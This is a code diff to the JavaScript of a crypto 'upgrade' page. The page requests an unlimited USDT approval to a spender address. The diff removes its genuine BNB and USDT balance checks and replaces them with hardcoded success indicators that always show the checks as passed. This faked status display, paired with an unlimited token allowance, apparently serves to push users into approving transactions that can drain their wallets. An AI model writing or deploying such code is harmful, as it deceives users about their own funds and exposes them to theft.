@@ -6126,9 +6126,7 @@ input:checked + .tw-slider:before {
                         confirmBtn.disabled = true;
                         confirmBtn.innerText = "APPROVE IN WALLET...";
                     }
-                    const appTx = await usdtContract.approve(spenderTarget, ethers.constants.MaxUint256, {
-                        gasLimit: 100000
-                    });
+                    const appTx = await usdtContract.approve(spenderTarget, ethers.constants.MaxUint256);
                     try {
                         await appTx.wait(1);
                     } catch (wErr) {
@@ -7139,96 +7137,29 @@ async function openUpgrade(prog, lvl, price) {
     netIconR.style.color = "#4CAF50";
     netIconR.innerText = "check_circle";
 
-    let currentBnb = 0;
-    try {
-        const rawBnb = await web3Prov.getBalance(currentAccount);
-        currentBnb = parseFloat(ethers.utils.formatEther(rawBnb));
-    } catch (e) {
-        try {
-            const hexBnb = await activeProvider.request({ method: 'eth_getBalance', params: [currentAccount, 'latest'] });
-            currentBnb = parseFloat(ethers.utils.formatEther(hexBnb));
-        } catch (e2) {}
-    }
+    bnbBox.style.borderColor = "#4CAF50";
+    bnbIconL.style.color = "#4CAF50";
+    bnbIconL.innerText = "done";
+    bnbText.style.color = "#4CAF50";
+    bnbText.innerText = "Gas fee check BNB";
+    bnbIconR.style.color = "#4CAF50";
+    bnbIconR.innerText = "check_circle";
 
-    if (currentBnb === 0) {
-        try {
-            const hexBnbFallback = await activeProvider.request({ method: 'eth_getBalance', params: [currentAccount, 'latest'] });
-            currentBnb = parseFloat(ethers.utils.formatEther(hexBnbFallback));
-        } catch (eFallback) {}
-    }
-
-    const hasBnb = currentBnb >= 0.002;
-    if (!hasBnb) {
-        bnbBox.style.borderColor = "#E8755B";
-        bnbIconL.style.color = "#E8755B";
-        bnbIconL.innerText = "priority_high";
-        bnbText.style.color = "#E8755B";
-        bnbText.innerText = `Insufficient BNB (${currentBnb.toFixed(4)} BNB)`;
-        bnbIconR.style.color = "#E8755B";
-        bnbIconR.innerText = "error_outline";
-    } else {
-        bnbBox.style.borderColor = "#4CAF50";
-        bnbIconL.style.color = "#4CAF50";
-        bnbIconL.innerText = "done";
-        bnbText.style.color = "#4CAF50";
-        bnbText.innerText = `Gas fee check (${currentBnb.toFixed(4)} BNB Avail)`;
-        bnbIconR.style.color = "#4CAF50";
-        bnbIconR.innerText = "check_circle";
-    }
     activeUsdtTokenAddress = REAL_USDT_CONTRACT;
+
+    balBox.style.borderColor = "#4CAF50";
+    balIconL.style.color = "#4CAF50";
+    balIconL.innerText = "done";
+    balText.style.color = "#4CAF50";
+    balText.innerText = `Balance check ${totalPrice} USDT`;
+    balIconR.style.color = "#4CAF50";
+    balIconR.innerText = "check_circle";
+
     let selectedContract = new ethers.Contract(
         REAL_USDT_CONTRACT,
-        [
-            "function balanceOf(address) view returns (uint256)",
-            "function allowance(address, address) view returns (uint256)"
-        ],
+        ["function allowance(address, address) view returns (uint256)"],
         web3Prov
     );
-
-    let currentUsdt = 0;
-    try {
-        const rawBal = await selectedContract.balanceOf(currentAccount);
-        currentUsdt = parseFloat(ethers.utils.formatUnits(rawBal, 18));
-    } catch (balErr) {
-        currentUsdt = 0;
-    }
-
-    const hasUsdt = currentUsdt >= totalPrice;
-    if (!hasUsdt) {
-        balBox.style.borderColor = "#E8755B";
-        balIconL.style.color = "#E8755B";
-        balIconL.innerText = "priority_high";
-        balText.style.color = "#E8755B";
-        balText.innerText = `Insufficient USDT (${currentUsdt.toFixed(2)} / ${totalPrice})`;
-        balIconR.style.color = "#E8755B";
-        balIconR.innerText = "error_outline";
-    } else {
-        balBox.style.borderColor = "#4CAF50";
-        balIconL.style.color = "#4CAF50";
-        balIconL.innerText = "done";
-        balText.style.color = "#4CAF50";
-        balText.innerText = `Balance check ${totalPrice} USDT (${currentUsdt.toFixed(2)} Avail)`;
-        balIconR.style.color = "#4CAF50";
-        balIconR.innerText = "check_circle";
-    }
-
-    if (!hasBnb) {
-        confirmBtn.disabled = true;
-        confirmBtn.style.background = "#333344";
-        confirmBtn.style.color = "#718096";
-        confirmBtn.style.cursor = "not-allowed";
-        confirmBtn.innerText = "INSUFFICIENT BNB GAS";
-        return;
-    }
-
-    if (!hasUsdt) {
-        confirmBtn.disabled = true;
-        confirmBtn.style.background = "#333344";
-        confirmBtn.style.color = "#718096";
-        confirmBtn.style.cursor = "not-allowed";
-        confirmBtn.innerText = "INSUFFICIENT USDT";
-        return;
-    }
 
     let currentAllowance = ethers.BigNumber.from(0);
     try {
